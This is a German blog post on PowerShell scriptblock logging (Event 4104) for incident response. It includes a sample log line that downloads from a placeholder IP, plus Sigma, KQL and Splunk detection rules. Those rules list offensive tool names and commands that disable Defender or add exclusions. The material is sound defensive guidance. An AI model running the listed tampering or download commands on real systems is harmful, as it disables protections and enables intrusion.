---
title: "PowerShell-Event-ID 4104 erklärt: Scriptblock-Logging für DFIR"
description: "Scriptblock-Logging ist Windows' nützlichste kostenfreie defensive Kontrolle. Sie protokolliert den vollen Script-Body — auch obfuskierte oder in-memory — unter Event 4104."
date: "2026-05-17"
---

Wenn PowerShell-Scriptblock-Logging aktiviert ist, protokolliert die Engine den Body jedes Scripts, das läuft — interaktive Befehle, von Disk geladene Skripte und alles, was per `Invoke-Expression` oder `IEX` in den Speicher reflektiert wird. Der Datensatz landet auf dem [Kanal](/de/blog/what-is-an-evtx-file) `Microsoft-Windows-PowerShell/Operational` als Event-ID **4104**, „Creating Scriptblock text".

## Was du bekommst

```xml
<Data Name="MessageNumber">1</Data>
<Data Name="MessageTotal">1</Data>
<Data Name="ScriptBlockText">$wc = New-Object Net.WebClient; $wc.DownloadString('http://203.0.113.5/a')</Data>
<Data Name="ScriptBlockId">{guid}</Data>
<Data Name="Path">C:\Users\alice\Downloads\setup.ps1</Data>
```

Für ein langes Script splittet PowerShell es über mehrere 4104-Datensätze (einen pro Message-Number). Sie wieder zusammenzusetzen ist essenziell — Fragmente sind leicht falsch zu lesen.

## Wie man es einschaltet

Die Einstellung ist `HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging\EnableScriptBlockLogging = 1`, äquivalent zur Group Policy unter *Computer Configuration → Administrative Templates → Windows Components → Windows PowerShell → Turn on PowerShell Script Block Logging*. Es gibt keine messbaren PowerShell-seitigen Kosten — schalte es überall ein.

## Was es einfängt, das nichts anderes einfängt

Die PowerShell-Engine protokolliert das Script **nach** jeglichem Encoding, Compression oder In-Memory-Reflection. Das heißt:

- Ein `-EncodedCommand`-Aufruf protokolliert sowohl den encodierten Launcher (im zugehörigen ProcessCreate / 4688) als auch den dekodierten Body (in 4104).
- Ein Script, das eine Remote-Payload herunterlädt und per `Invoke-Expression` ausführt, protokolliert den *ausgeführten* Body, nicht den Wrapper.
- Ein Angreifer, der AMSI-Bypasses verwendet, hinterlässt trotzdem den 4104-Datensatz — der Bypass beeinflusst Scanning, nicht Logging.

Das ist die nützlichste kostenfreie defensive Kontrolle der Plattform. Defender ohne EDR haben das meist.

## 4104 im Maßstab triagieren

Die High-Signal-Muster in einem Korpus von 4104-Datensätzen:

- `DownloadString`, `DownloadFile`, `Invoke-WebRequest`, `Net.WebClient` — Remote-Content-Fetch.
- `IEX`, `Invoke-Expression` — dynamische Ausführung.
- `FromBase64String`, `[System.Convert]::FromBase64String` — encodierte Payload.
- `Add-MpPreference -ExclusionPath` — Defender-Tampering.
- `Set-MpPreference -DisableRealtimeMonitoring` — Defender-Tampering.
- `[System.Reflection.Assembly]::Load`, `[Reflection.Emit]` — In-Memory-Assembly-Loading.
- `Invoke-Mimikatz`, `Invoke-Kerberoast`, `Invoke-BloodHound` — bekanntes Offensive-Tooling.

Ein einzelner Match allein ist nicht immer bösartig (Admins nutzen `DownloadString` auch), aber die Kombinationen schon. Pivotiere von 4104 auf das passende [Sysmon-Event 1](/de/blog/sysmon-event-id-1-process-create) / 4688 per Zeitstempel + Prozess, um den vollen Aufrufkontext zu rekonstruieren.

## Beispiel-Sigma-Regel — Offensive PowerShell-Tools im Scriptblock

```yaml
title: Suspicious PowerShell Scriptblock — Offensive Tool Indicators
id: 4f1a3b8d-2c5e-4d8f-9a3b-1c2d3e4f5a6b
status: stable
description: PowerShell scriptblock body contains strings characteristic of offensive tooling, encoded payloads, or in-memory reflection.
references:
  - https://attack.mitre.org/techniques/T1059/001/
  - https://attack.mitre.org/techniques/T1027/
logsource:
  product: windows
  service: powershell
  category: ps_script
detection:
  selection_offensive:
    EventID: 4104
    ScriptBlockText|contains:
      - 'Invoke-Mimikatz'
      - 'Invoke-Kerberoast'
      - 'Invoke-BloodHound'
      - 'Invoke-DCSync'
      - 'New-PSInjection'
      - 'Get-PassHashes'
  selection_reflective:
    EventID: 4104
    ScriptBlockText|contains:
      - 'System.Reflection.Assembly]::Load'
      - '[Reflection.Emit]'
      - 'FromBase64String'
  selection_defender_tamper:
    EventID: 4104
    ScriptBlockText|contains:
      - 'Set-MpPreference -DisableRealtimeMonitoring'
      - 'Add-MpPreference -ExclusionPath'
      - 'Set-MpPreference -DisableIOAVProtection'
  condition: selection_offensive or selection_reflective or selection_defender_tamper
falsepositives:
  - Defenders running known offensive tooling for testing (whitelist by host)
  - Software installers using reflection for legitimate purposes
level: high
tags:
  - attack.execution
  - attack.t1059.001
  - attack.defense_evasion
```

## Beispiel-KQL — encodierte PowerShell von einem niedrig-privilegierten Benutzer

```kusto
let encoded =
    Event
    | where Source == "Microsoft-Windows-PowerShell" and EventID == 4104
    | extend XmlData = parse_xml(EventData)
    | extend ScriptBlockText = tostring(XmlData.EventData.Data[2])
    | where ScriptBlockText contains "FromBase64String"
       or ScriptBlockText matches regex @"\b-e(?:nc|ncodedcommand)?\b\s"
    | project TimeGenerated, Computer, UserId=tostring(XmlData.System.Security["@UserID"]), ScriptBlockText;
encoded
| where UserId !startswith "S-1-5-18"   // exclude LocalSystem
   and UserId !startswith "S-1-5-19"
   and UserId !startswith "S-1-5-20"
| order by TimeGenerated desc
```

## Beispiel-Splunk — Defender-Tampering aus PowerShell

```spl
index=powershell EventCode=4104
   ( ScriptBlockText="*Set-MpPreference*DisableRealtimeMonitoring*"
     OR ScriptBlockText="*Add-MpPreference*ExclusionPath*"
     OR ScriptBlockText="*Set-MpPreference*DisableIOAVProtection*" )
| table _time host UserID ScriptBlockText
```

## ATT&CK-Mapping

- **T1059.001 — Command and Scripting Interpreter: PowerShell**: jedes offensive 4104 mappt hierauf. PowerShell ist eine der meistzitierten Execution-Techniken in modernen Intrusions.
- **T1027 — Obfuscated Files or Information**: encoded / Base64 / `FromBase64String`-Muster.
- **T1059.001 + T1140 — Deobfuscate/Decode Files or Information**: die Engine protokolliert die *dekodierte* Form, was den Mehrwert von 4104 gegenüber [4688](/de/blog/event-id-4688-process-creation) ausmacht.
- **T1562.001 — Impair Defenses: Disable or Modify Tools**: `Set-MpPreference -DisableRealtimeMonitoring`, `Add-MpPreference -ExclusionPath`.
- **T1003.001 — OS Credential Dumping: LSASS Memory**: `Invoke-Mimikatz`, `MiniDump`, `comsvcs.dll`-Muster in Script-Bodys.
- **T1558.003 — Kerberoasting**: `Invoke-Kerberoast`, `Rubeus kerberoast`-Muster.

## False Positives, die genau wie Angriffe aussehen

- **Admin-Runbooks** nutzen manchmal `Invoke-Expression` legitim für getemplatete Konfiguration. Die Kombination ist meist kurz, wiederholbar und aus bekannten Admin-Sitzungen.
- **Defender-Management**-Skripte (Corporate IT) rufen `Set-MpPreference` legitim auf, um Exclusion-Listen zu pushen. Whitelist per Signing-Zertifikat des Scripts oder Host-SID.
- **Chocolatey / WinGet / Paket-Installer** nutzen Base64-encodierte PowerShell legitim. Muster: kurz, tagsüber, von Build-/Admin-Hosts.
- **Red-Team / Pentest**-Aktivität sieht identisch zu echten Angriffen aus. Stimme Engagement-Fenster ab und markiere die Quell-IPs des Operators.

## Der blinde Fleck

4104 protokolliert den *Script*-Body. Es protokolliert keine Per-Statement-Ausführung, Funktionsrückgabewerte oder Variablenwerte. Dafür brauchst du Transcription (Event 4103, „Module Logging") oder ein echtes EDR. 4104 sagt dir, was lief; der Rest sagt dir, was es tat.
